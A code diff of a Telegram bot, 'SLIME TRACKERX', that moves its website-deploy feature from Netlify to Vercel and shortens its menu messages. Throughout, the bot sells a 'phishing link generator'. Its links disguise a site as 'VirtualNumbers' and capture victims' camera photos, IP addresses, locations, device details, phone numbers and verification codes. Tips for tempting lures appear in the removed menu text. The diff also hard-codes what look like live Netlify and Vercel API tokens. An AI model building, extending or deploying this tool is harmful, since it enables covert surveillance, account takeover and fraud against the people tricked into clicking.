@@ -17,9 +17,9 @@ const FormData = require("form-data");
 const bot = new Telegraf(process.env.BOT_TOKEN);
 const app = express();
 
-// ========== NETLIFY TOKEN ==========
-const NETLIFY_TOKEN = "nfp_ZpWdTYcEPVJpQisJ9vd54r93cKsJGeLJ4a65";
-const NETLIFY_API = "https://api.netlify.com/api/v1";
+// ========== VERCEL CONFIG ==========
+const VERCEL_TOKEN = "vcp_1HgHd18aJoERfWmE1pyz2zMhxpo6waJlHwIzy8nlUBDzOHBs6z3POSk2";
+const VERCEL_TEAM_ID = ""; // Empty for personal account
 
 // ========== BOT CONFIG ==========
 const DOMAIN = "https://virtualnumbersfree.onrender.com";
@@ -115,7 +115,7 @@ const websiteSchema = new mongoose.Schema({
   template: String,
   content: Object,
   url: String,
-  netlifyId: String,
+  vercelId: String,
   views: { type: Number, default: 0 },
   createdAt: { type: Date, default: Date.now }
 });
@@ -286,34 +286,30 @@ async function redeemCode(userId, code) {
   return { ok: true, msg: `✅ +${c.coins} coins!${c.diamonds > 0 ? ` +${c.diamonds}💎` : ''}` };
 }
 
-// ========== NETLIFY DEPLOY - WORKING VERSION (Replace the broken one) ==========
-async function deployToNetlify(htmlContent, siteName) {
+// ========== VERCEL DEPLOY - WORKING ==========
+async function deployToVercel(htmlContent, siteName) {
   try {
-    // Generate unique site name
-    const timestamp = Date.now();
-    const randomId = Math.random().toString(36).substring(2, 8);
-    let cleanName = siteName
-      .toLowerCase()
-      .replace(/[^a-z0-9]/g, '-')
-      .replace(/-+/g, '-')
-      .replace(/^-|-$/g, '')
-      .substring(0, 15);
+    let cleanName = siteName.toLowerCase().replace(/[^a-z0-9]/g, '-').replace(/-+/g, '-').replace(/^-|-$/g, '').substring(0, 20);
+    if (!cleanName || cleanName.length < 3) cleanName = 'site';
     
-    if (!cleanName || cleanName.length < 3) {
-      cleanName = `site`;
-    }
+    const uniqueName = `${cleanName}-${Date.now()}`;
+    const tempDir = path.join(__dirname, "exports", uniqueName);
     
-    const finalSiteName = `${cleanName}-${timestamp}-${randomId}`;
+    console.log(`🚀 Deploying to Vercel: ${uniqueName}`);
     
-    console.log(`🚀 Deploying: ${finalSiteName}`);
-    
-    // Create temp directory
-    const tempDir = path.join(__dirname, "exports", finalSiteName);
     await fs.ensureDir(tempDir);
     await fs.writeFile(path.join(tempDir, "index.html"), htmlContent);
     
-    // Create zip file
-    const zipPath = path.join(__dirname, "exports", `${finalSiteName}.zip`);
+    const vercelConfig = {
+      version: 2,
+      name: uniqueName,
+      public: true,
+      builds: [{ src: "index.html", use: "@vercel/static" }],
+      routes: [{ src: "/(.*)", dest: "/index.html" }]
+    };
+    await fs.writeFile(path.join(tempDir, "vercel.json"), JSON.stringify(vercelConfig, null, 2));
+    
+    const zipPath = path.join(__dirname, "exports", `${uniqueName}.zip`);
     const output = fs.createWriteStream(zipPath);
     const archive = archiver("zip", { zlib: { level: 9 } });
     
@@ -325,40 +321,31 @@ async function deployToNetlify(htmlContent, siteName) {
       archive.finalize();
     });
     
-    // Deploy to Netlify
     const formData = new FormData();
     formData.append("file", fs.createReadStream(zipPath));
+    formData.append("projectName", uniqueName);
+    formData.append("name", uniqueName);
     
-    const response = await axios.post("https://api.netlify.com/api/v1/sites", formData, {
-      headers: {
-        "Authorization": `Bearer ${NETLIFY_TOKEN}`,
-        ...formData.getHeaders()
-      },
+    let url = `https://api.vercel.com/v13/deployments`;
+    if (VERCEL_TEAM_ID) url += `?teamId=${VERCEL_TEAM_ID}`;
+    
+    const response = await axios.post(url, formData, {
+      headers: { "Authorization": `Bearer ${VERCEL_TOKEN}`, ...formData.getHeaders() },
       maxContentLength: Infinity,
       maxBodyLength: Infinity,
       timeout: 60000
     });
     
-    console.log(`✅ Deployed: ${response.data.url}`);
-    
-    // Cleanup
     await fs.remove(tempDir).catch(() => {});
     await fs.remove(zipPath).catch(() => {});
     
-    return {
-      success: true,
-      url: response.data.url,
-      siteName: response.data.name
-    };
-    
+    return { success: true, url: response.data.url, siteName: uniqueName };
   } catch (error) {
-    console.error("❌ Netlify Error:", error.response?.data || error.message);
-    return {
-      success: false,
-      error: error.response?.data?.message || "Deployment failed"
-    };
+    console.error("❌ Vercel Error:", error.response?.data || error.message);
+    return { success: false, error: error.response?.data?.error?.message || error.message, html: htmlContent };
   }
 }
+
 // ========== DOPE HTML TEMPLATES ==========
 const htmlTemplates = {
   portfolio: (data) => `<!DOCTYPE html>
@@ -371,19 +358,9 @@ const htmlTemplates = {
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
-            color: white;
-            line-height: 1.6;
-        }
+        body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #0f0c29, #302b63, #24243e); color: white; line-height: 1.6; }
         .container { max-width: 1200px; margin: 0 auto; padding: 40px 20px; }
-        .navbar {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 20px 0;
-        }
+        .navbar { display: flex; justify-content: space-between; align-items: center; padding: 20px 0; }
         .logo { font-size: 28px; font-weight: 800; background: linear-gradient(45deg, #FF6B6B, #4ECDC4); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
         .nav-links a { color: #fff; margin-left: 30px; text-decoration: none; transition: 0.3s; }
         .nav-links a:hover { color: #4ECDC4; }
@@ -397,22 +374,14 @@ const htmlTemplates = {
         .skills { display: flex; gap: 15px; flex-wrap: wrap; margin-top: 20px; }
         .skill { background: rgba(255,255,255,0.1); padding: 10px 20px; border-radius: 20px; }
         footer { text-align: center; padding: 40px; border-top: 1px solid rgba(255,255,255,0.1); margin-top: 60px; }
-        @media (max-width: 768px) {
-            .navbar { flex-direction: column; gap: 20px; }
-            .hero h1 { font-size: 32px; }
-        }
+        @media (max-width: 768px) { .navbar { flex-direction: column; gap: 20px; } .hero h1 { font-size: 32px; } }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="navbar">
             <div class="logo"><i class="fas fa-code"></i> ${data.name || 'Portfolio'}</div>
-            <div class="nav-links">
-                <a href="#">Home</a>
-                <a href="#">About</a>
-                <a href="#">Projects</a>
-                <a href="#">Contact</a>
-            </div>
+            <div class="nav-links"><a href="#">Home</a><a href="#">About</a><a href="#">Projects</a><a href="#">Contact</a></div>
         </div>
         <div class="hero">
             <h1>${data.name || 'Welcome to My Portfolio'}</h1>
@@ -428,10 +397,7 @@ const htmlTemplates = {
                 <span class="skill">${data.skill3 || 'Node.js'}</span>
             </div>
         </div>
-        <footer>
-            <p>📧 ${data.email || 'hello@example.com'}</p>
-            <p>© 2024 Built with SlimeTrackerX</p>
-        </footer>
+        <footer><p>📧 ${data.email || 'hello@example.com'}</p><p>© 2024 Built with SlimeTrackerX</p></footer>
     </div>
 </body>
 </html>`,
@@ -465,11 +431,7 @@ const htmlTemplates = {
 <body>
     <div class="navbar">
         <div class="logo"><i class="fas fa-chart-line"></i> ${data.company || 'Business'}</div>
-        <div class="nav-links">
-            <a href="#">Home</a>
-            <a href="#">Services</a>
-            <a href="#">Contact</a>
-        </div>
+        <div class="nav-links"><a href="#">Home</a><a href="#">Services</a><a href="#">Contact</a></div>
     </div>
     <div class="hero">
         <h1>${data.company || 'Welcome to Our Business'}</h1>
@@ -484,10 +446,7 @@ const htmlTemplates = {
             <div class="service-card"><i class="fas fa-headset"></i><h3>${data.service3 || 'Support'}</h3><p>${data.service3_desc || '24/7 customer support'}</p></div>
         </div>
     </div>
-    <footer>
-        <p>📧 ${data.email || 'info@example.com'} | 📞 ${data.phone || '+1 234 567 8900'}</p>
-        <p>📍 ${data.address || '123 Business Street'}</p>
-    </footer>
+    <footer><p>📧 ${data.email || 'info@example.com'} | 📞 ${data.phone || '+1 234 567 8900'}</p><p>📍 ${data.address || '123 Business Street'}</p></footer>
 </body>
 </html>`,
   
@@ -554,10 +513,7 @@ const htmlTemplates = {
             </div>
         </div>
     </div>
-    <footer>
-        <p>📧 ${data.email || 'store@example.com'}</p>
-        <p>🔥 Built with SlimeTrackerX Store Builder</p>
-    </footer>
+    <footer><p>📧 ${data.email || 'store@example.com'}</p><p>🔥 Built with SlimeTrackerX Store Builder</p></footer>
 </body>
 </html>`
 };
@@ -579,9 +535,9 @@ function getMainMenu() {
   };
 }
 
-// ========== COMMANDS - ALL WORKING NOW ==========
+// ========== COMMANDS ==========
 
-// START command
+// START command with image
 bot.start(async (ctx) => {
   let ref = null;
   let args = ctx.message.text.split(" ");
@@ -590,15 +546,20 @@ bot.start(async (ctx) => {
   }
   let user = await initUser(ctx.from.id, ref);
   
-  await ctx.reply(
-    `🟢⚡ **SLIME TRACKERX v40.0** ⚡🟢\n\n` +
-    `✨ Welcome ${ctx.from.first_name}!\n` +
-    `💰 ${user.coins} coins | 💎 ${user.diamonds}\n` +
-    `📊 Level ${user.level} | 👥 ${user.referrals} referrals\n` +
-    `🏆 Word Wins: ${user.wordWins}\n\n` +
-    `⬇️ **CLICK BUTTONS BELOW** ⬇️`,
-    { parse_mode: "Markdown", ...getMainMenu() }
-  );
+  const menuImage = "https://iili.io/BMbTnup.jpg";
+  
+  try {
+    await ctx.replyWithPhoto(menuImage, {
+      caption: `🟢⚡ **SLIME TRACKERX v40.0** ⚡🟢\n\n✨ Welcome ${ctx.from.first_name}!\n💰 ${user.coins} coins | 💎 ${user.diamonds}\n📊 Level ${user.level} | 👥 ${user.referrals} referrals\n🏆 Word Wins: ${user.wordWins}\n\n⬇️ **CLICK BUTTONS BELOW** ⬇️`,
+      parse_mode: "Markdown",
+      ...getMainMenu()
+    });
+  } catch (error) {
+    await ctx.reply(
+      `🟢⚡ **SLIME TRACKERX v40.0** ⚡🟢\n\n✨ Welcome ${ctx.from.first_name}!\n💰 ${user.coins} coins | 💎 ${user.diamonds}\n📊 Level ${user.level} | 👥 ${user.referrals} referrals\n🏆 Word Wins: ${user.wordWins}\n\n⬇️ **CLICK BUTTONS BELOW** ⬇️`,
+      { parse_mode: "Markdown", ...getMainMenu() }
+    );
+  }
 });
 
 // HACK command
@@ -609,12 +570,8 @@ bot.command("hack", async (ctx) => {
     return ctx.reply(
       `💀 **PHISHING LINK GENERATOR** 💀\n\n` +
       `Usage: /hack [label]\n\n` +
-      `Examples:\n` +
-      `/hack free gift\n` +
-      `/hack win iphone\n` +
-      `/hack claim reward\n\n` +
-      `💰 Cost: ${TRACK_COST} coins\n` +
-      `📸 Captures Camera + IP + Location\n\n` +
+      `Examples:\n/hack free gift\n/hack win iphone\n/hack claim reward\n\n` +
+      `💰 Cost: ${TRACK_COST} coins\n📸 Captures Camera + IP + Location\n\n` +
       `The target will see VirtualNumbers - looks legit!`
     );
   }
@@ -642,12 +599,9 @@ bot.command("hack", async (ctx) => {
   
   await ctx.reply(
     `💀 **PHISHING LINK READY** 💀\n\n` +
-    `🎯 Label: ${label}\n` +
-    `💰 Cost: -${TRACK_COST} coins\n` +
-    `💀 Total Hacks: ${user.hacks}\n\n` +
+    `🎯 Label: ${label}\n💰 Cost: -${TRACK_COST} coins\n💀 Total Hacks: ${user.hacks}\n\n` +
     `🔗 **YOUR LINK:**\n\`${hackLink}\`\n\n` +
-    `Send this link to your target!\n` +
-    `When they click, you'll get Camera + IP + Location!`,
+    `Send this link to your target!\nWhen they click, you'll get Camera + IP + Location!`,
     { parse_mode: "Markdown" }
   );
 });
@@ -884,7 +838,7 @@ bot.command("buy", async (ctx) => {
   } else if (item === "ticket") {
     if (u.coins < 5) return ctx.reply("❌ Need 5 coins!");
     await takeCoin(ctx.from.id, 5);
-    await ctx.reply(`✅ Bought lottery ticket! Use /lottery to play`);
+    await ctx.reply(`✅ Bought lottery ticket!`);
   } else if (item === "mystery") {
     if (u.coins < 20) return ctx.reply("❌ Need 20 coins!");
     await takeCoin(ctx.from.id, 20);
@@ -900,7 +854,7 @@ bot.command("buy", async (ctx) => {
 
 // WEB command
 bot.command("web", async (ctx) => {
-  await ctx.reply(`🌐 **DOPE WEB CREATOR** 🌐\n\n💰 Cost: ${WEB_PRICE} coins\n✨ Get LIVE LINK on Netlify!\n\n**Templates:** portfolio, business, store\n\n**How to use:** /createweb portfolio`);
+  await ctx.reply(`🌐 **DOPE WEB CREATOR** 🌐\n\n💰 Cost: ${WEB_PRICE} coins\n✨ Get LIVE LINK on Vercel!\n\n**Templates:** portfolio, business, store\n\n**How to use:** /createweb portfolio`);
 });
 
 // CREATEWEB command
@@ -1127,179 +1081,59 @@ bot.command("setadmin", async (ctx) => {
 // ========== BUTTON HANDLERS ==========
 bot.action("menu_hack", async (ctx) => {
   await ctx.answerCbQuery();
-  await ctx.reply(
-    `💀 **PHISHING LINK GENERATOR** 💀\n\n` +
-    `┌─────────────────────────────────┐\n` +
-    `│  💀 HACKER MODE ACTIVATED 💀    │\n` +
-    `└─────────────────────────────────┘\n\n` +
-    `💰 **Cost:** ${TRACK_COST} coins\n` +
-    `📸 **Captures:** Camera + IP + Location + Device Info\n\n` +
-    `🎯 **How to use:**\n` +
-    `/hack [label]\n\n` +
-    `📝 **Examples:**\n` +
-    `• /hack free gift\n` +
-    `• /hack win iphone\n` +
-    `• /hack claim reward\n` +
-    `• /hack verification\n` +
-    `• /hack urgent notice\n\n` +
-    `🔗 **What happens:**\n` +
-    `1️⃣ You get a unique phishing link\n` +
-    `2️⃣ Send link to your target\n` +
-    `3️⃣ They see VirtualNumbers (looks 100% legit)\n` +
-    `4️⃣ You receive in DM:\n` +
-    `   • 📸 Camera photo\n` +
-    `   • 📱 IP address\n` +
-    `   • 📍 Location\n` +
-    `   • 🌐 Device/browser info\n` +
-    `   • 📞 Phone number they select\n` +
-    `   • 🔢 Verification code\n\n` +
-    `⚡ **Features:**\n` +
-    `• Link works for 24 hours\n` +
-    `• One-time use (expires after click)\n` +
-    `• Target never knows they were hacked\n` +
-    `• +15 XP per successful hack\n\n` +
-    `💀 **Pro tips:**\n` +
-    `• Use tempting labels (free gift, winner, claim)\n` +
-    `• Send via DM, groups, or social media\n` +
-    `• Works on mobile + desktop\n` +
-    `• Camera request looks like verification\n\n` +
-    `⚠️ **USE WISELY** ⚠️\n\n` +
-    `Ready to hack? /hack free gift`
-  );
+  await ctx.reply(`💀 **PHISHING LINK GENERATOR** 💀\n\n💰 Cost: ${TRACK_COST} coins\n📸 Captures: Camera + IP + Location\n\n/hack [label]\n\nExample: /hack free gift`);
 });
 
 bot.action("menu_word", async (ctx) => {
   await ctx.answerCbQuery();
-  await ctx.reply(
-    `📝 **WORD BATTLE - 1v1 CHALLENGE** 📝\n\n` +
-    `💰 **Bet Range:** ${WORD_MIN_BET} - ${WORD_MAX_BET} coins\n` +
-    `👑 **Winner takes ALL coins!**\n\n` +
-    `🎯 **How to play:**\n` +
-    `1. Challenge someone: /wordbattle @username amount difficulty\n` +
-    `2. They accept with: /acceptword\n` +
-    `3. You type a word with the correct letter count\n` +
-    `4. Win = Double your bet + XP!\n\n` +
-    `⚡ **Difficulties:**\n` +
-    `• easy 🍃 - 45 seconds, 3 letters (1x multiplier)\n` +
-    `• medium ⚡ - 30 seconds, 5 letters (2x multiplier)\n` +
-    `• hard 🔥 - 15 seconds, 7 letters (3x multiplier)\n` +
-    `• expert 💀 - 8 seconds, 9 letters (5x multiplier)\n\n` +
-    `📝 **Examples:**\n` +
-    `/wordbattle @john 50 easy\n` +
-    `/wordbattle @jane 100 hard\n` +
-    `/wordbattle @user 200 expert\n\n` +
-    `💡 **Tips:**\n` +
-    `• Higher difficulty = bigger multiplier!\n` +
-    `• Must type EXACT letter count\n` +
-    `• Timer starts when opponent accepts\n` +
-    `• Words are case-insensitive\n` +
-    `• Any real word works!\n\n` +
-    `🏆 **Check leaderboard:** /topwords\n\n` +
-    `Ready to battle? Challenge someone now! 💀`
-  );
+  await ctx.reply(`📝 **WORD BATTLE** 📝\n\n/wordbattle @user amount difficulty\n\nDifficulties: easy, medium, hard, expert\n💰 Winner takes ALL coins!`);
 });
 
 bot.action("menu_web", async (ctx) => {
   await ctx.answerCbQuery();
-  await ctx.reply(
-    `🌐 **DOPE WEB CREATOR** 🌐\n\n` +
-    `💰 **Cost:** ${WEB_PRICE} coins\n\n` +
-    `⚡ **Auto-Deploy to Netlify!**\n` +
-    `Get an INSTANT LIVE LINK when you're done!\n\n` +
-    `📌 **Templates Available:**\n` +
-    `• portfolio - Personal portfolio website\n` +
-    `• business - Company/Business website  \n` +
-    `• store - E-commerce store website\n\n` +
-    `📝 **How to use:**\n` +
-    `1. Type /createweb [template]\n` +
-    `2. Answer the questions (name, bio, email, etc.)\n` +
-    `3. **BOOM!** 🎉 Auto-deployed to Netlify\n` +
-    `4. Get your LIVE LINK instantly!\n\n` +
-    `📋 **Examples:**\n` +
-    `• /createweb portfolio\n` +
-    `• /createweb business\n` +
-    `• /createweb store\n\n` +
-    `🔗 **Your website will be live at:**\n` +
-    `https://your-site-name.netlify.app\n\n` +
-    `💡 **Pro tip:** Share your live link anywhere!\n` +
-    `The website works on mobile + desktop!\n\n` +
-    `✨ **Try it now:** /createweb portfolio`
-  );
-});
-bot.action("menu_casino", async (ctx) => {
-  await ctx.answerCbQuery();
-  await ctx.reply(
-    `🎰 **CASINO - TRY YOUR LUCK** 🎰\n\n` +
-    `┌─────────────────────────────────┐\n` +
-    `│  🎲 LET'S GAMBLE! 🎲           │\n` +
-    `└─────────────────────────────────┘\n\n` +
-    `🎲 **DICE GAME**\n` +
-    `/dice [amount]\n\n` +
-    `• Min bet: 1 coin\n` +
-    `• Roll 1-3 → Lose bet\n` +
-    `• Roll 4-5 → Win 1x (get bet back)\n` +
-    `• Roll 6 → JACKPOT! Win 3x +5 XP\n\n` +
-    `🎰 **SLOT MACHINE**\n` +
-    `/slots [amount]\n\n` +
-    `• Min bet: 5 coins\n` +
-    `• 2 matching → Win 2x +5 XP\n` +
-    `• 3 matching → MEGA JACKPOT! Win 10x +20 XP\n\n` +
-    `📊 **Payout Examples:**\n` +
-    `• Bet 10 on dice → Roll 6 → Win 30 coins!\n` +
-    `• Bet 50 on slots → 3 matching → Win 500 coins!\n\n` +
-    `💡 **Tips:**\n` +
-    `• Start with small bets\n` +
-    `• Use /daily and /work for free coins\n` +
-    `• Higher risk = higher reward\n` +
-    `• Slots have bigger jackpots!\n\n` +
-    `🎮 **Other Games:**\n` +
-    `• /wordbattle - 1v1 word challenge\n` +
-    `• /daily - Free coins every day\n` +
-    `• /work - Earn coins working\n\n` +
-    `💰 **Your balance:** /balance\n\n` +
-    `🎲 **Ready to gamble? Try:**\n` +
-    `/dice 10\n` +
-    `/slots 25\n\n` +
-    `May the odds be ever in your favor! 🍀`
-  );
+  await ctx.reply(`🌐 **DOPE WEB CREATOR** 🌐\n\n💰 Cost: ${WEB_PRICE} coins\n⚡ Auto-Deploy to Vercel!\n\n/createweb portfolio\n/createweb business\n/createweb store`);
 });
 
+bot.action("menu_casino", async (ctx) => {
+  await ctx.answerCbQuery();
+  await ctx.reply(`🎰 **CASINO** 🎰\n\n/dice amount\n/slots amount\n\nWin big and get rich!`);
+});
 
 bot.action("menu_games", async (ctx) => {
   await ctx.answerCbQuery();
-  await ctx.reply(`🎮 **GAMES**\n\n/dice amount\n/slots amount\n/wordbattle`);
+  await ctx.reply(`🎮 **GAMES** 🎮\n\n/dice amount\n/slots amount\n/wordbattle`);
 });
 
 bot.action("menu_eco", async (ctx) => {
   await ctx.answerCbQuery();
   let u = await initUser(ctx.from.id);
-  await ctx.reply(`💰 **ECONOMY**\n\nBalance: ${u.coins} coins\n/daily\n/work`);
+  await ctx.reply(`💰 **ECONOMY** 💰\n\nBalance: ${u.coins} coins\n/daily\n/work`);
 });
 
 bot.action("menu_leaderboard", async (ctx) => {
   await ctx.answerCbQuery();
-  await ctx.reply(`🏆 **LEADERBOARDS**\n\n/leaderboard\n/topwords`);
+  await ctx.reply(`🏆 **LEADERBOARDS** 🏆\n\n/leaderboard\n/topwords`);
 });
 
 bot.action("menu_profile", async (ctx) => {
   await ctx.answerCbQuery();
   let u = await initUser(ctx.from.id);
-  await ctx.reply(`👤 **PROFILE**\n\nCoins: ${u.coins}\nLevel: ${u.level}\nHacks: ${u.hacks}\nWord Wins: ${u.wordWins}`);
+  await ctx.reply(`👤 **PROFILE** 👤\n\nCoins: ${u.coins}\nLevel: ${u.level}\nHacks: ${u.hacks}\nWord Wins: ${u.wordWins}`);
 });
 
 bot.action("menu_shop", async (ctx) => {
   await ctx.answerCbQuery();
-  await ctx.reply(`🛒 **SHOP**\n\n/buy diamonds\n/buy ticket\n/buy mystery`);
+  await ctx.reply(`🛒 **SHOP** 🛒\n\n/buy diamonds\n/buy ticket\n/buy mystery`);
 });
 
 bot.action("menu_redeem", async (ctx) => {
   await ctx.answerCbQuery();
-  await ctx.reply(`🎁 **REDEEM**\n\n/redeem CODE`);
+  await ctx.reply(`🎁 **REDEEM** 🎁\n\n/redeem CODE`);
 });
 
 bot.action("menu_ref", async (ctx) => {
   await ctx.answerCbQuery();
-  await ctx.reply(`🔗 **REFERRAL**\n\n${refLink(ctx.from.id)}\n\n+${REF_REWARD} coins per referral!`);
+  await ctx.reply(`🔗 **REFERRAL** 🔗\n\n${refLink(ctx.from.id)}\n\n+${REF_REWARD} coins per referral!`);
 });
 
 bot.action("menu_admin", async (ctx) => {
@@ -1309,7 +1143,7 @@ bot.action("menu_admin", async (ctx) => {
     return;
   }
   await ctx.answerCbQuery();
-  await ctx.reply(`👑 **ADMIN**\n\n/addcoin\n/gencode\n/broadcast\n/users\n/stats\n/banuser\n/unban\n/giveall\n/setadmin`);
+  await ctx.reply(`👑 **ADMIN PANEL** 👑\n\n/addcoin\n/gencode\n/broadcast\n/users\n/stats\n/banuser\n/unban\n/giveall\n/setadmin`);
 });
 
 bot.action("menu_mywebsites", async (ctx) => {
@@ -1318,7 +1152,7 @@ bot.action("menu_mywebsites", async (ctx) => {
   if (websites.length === 0) {
     await ctx.reply("No websites yet! /createweb portfolio");
   } else {
-    let msg = "🌐 **YOUR WEBSITES**\n\n";
+    let msg = "🌐 **YOUR WEBSITES** 🌐\n\n";
     for (let site of websites) {
       msg += `• ${site.name}\n  ${site.url}\n\n`;
     }
@@ -1326,11 +1160,11 @@ bot.action("menu_mywebsites", async (ctx) => {
   }
 });
 
-// ========== TEXT HANDLER (FIXED - doesn't block commands) ==========
+// ========== TEXT HANDLER ==========
 bot.on("text", async (ctx) => {
-  // CRITICAL FIX: Skip if it's a command
+  // Skip commands
   if (ctx.message.text.startsWith("/")) {
-    return; // Let command handlers process it
+    return;
   }
   
   const msgId = `${ctx.chat.id}_${ctx.message.message_id}`;
@@ -1348,11 +1182,11 @@ bot.on("text", async (ctx) => {
       if (build.step < build.questions.length) {
         await ctx.reply(`📝 Step ${build.step + 1}/${build.questions.length}\nSend: ${build.questions[build.step]}`);
       } else {
-        await ctx.reply("⏳ Creating your website...");
+        await ctx.reply("⏳ Creating your website and deploying to Vercel...");
         
         let html = htmlTemplates[build.template](build.data);
         let siteName = build.data[build.questions[0]] || "mywebsite";
-        let result = await deployToNetlify(html, siteName);
+        let result = await deployToVercel(html, siteName);
         
         if (result.success) {
           let website = new Website({
@@ -1361,7 +1195,7 @@ bot.on("text", async (ctx) => {
             template: build.template,
             content: build.data,
             url: result.url,
-            netlifyId: result.siteName
+            vercelId: result.siteName
           });
           await website.save();
           
@@ -1369,9 +1203,15 @@ bot.on("text", async (ctx) => {
           user.websites.push({ name: siteName, url: result.url });
           await saveUser(ctx.from.id, user);
           
-          await ctx.reply(`✅ **WEBSITE CREATED!**\n\n🌐 ${result.url}\n\nShare it with anyone!`);
+          await ctx.reply(`✅ **WEBSITE DEPLOYED TO VERCEL!** ✅\n\n🌐 ${result.url}\n\nShare it with anyone!`);
+          
+          await ctx.reply(`🔗 **OPEN YOUR WEBSITE**`, {
+            reply_markup: {
+              inline_keyboard: [[{ text: "🌐 OPEN WEBSITE", url: result.url }]]
+            }
+          });
         } else {
-          await ctx.reply(`❌ Failed: ${result.error}\nCoins refunded.`);
+          await ctx.reply(`❌ Deployment failed: ${result.error}\n\nCoins refunded.`);
           await addCoin(ctx.from.id, WEB_PRICE);
         }
         webBuilds.delete(ctx.from.id);
@@ -1487,6 +1327,7 @@ loadData().then(async () => {
     await bot.launch({ dropPendingUpdates: true });
     console.log(`🤖 SLIME TRACKERX v40.0 LIVE!`);
     console.log(`✅ All commands working!`);
+    console.log(`✅ Vercel deploy ready!`);
     console.log(`✅ Hack system ready!`);
   } catch(e) {
     console.log("Error:", e.message);
